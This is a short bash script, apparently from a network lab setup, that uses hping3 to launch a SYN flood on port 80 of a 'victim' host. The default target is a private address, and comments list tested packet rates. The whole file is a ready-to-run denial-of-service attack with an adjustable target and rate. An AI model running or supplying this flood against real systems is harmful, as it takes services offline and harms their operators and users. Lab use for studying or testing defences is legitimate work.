#!/bin/bash
# SYN flood against the victim (tested rate: u2000 = 500 packets/s, u500 = 2000 packets/s)
VICTIM=${1:-172.30.0.10}; INTERVAL=${2:-u2000}
exec hping3 -S -p 80 -i "$INTERVAL" "$VICTIM"
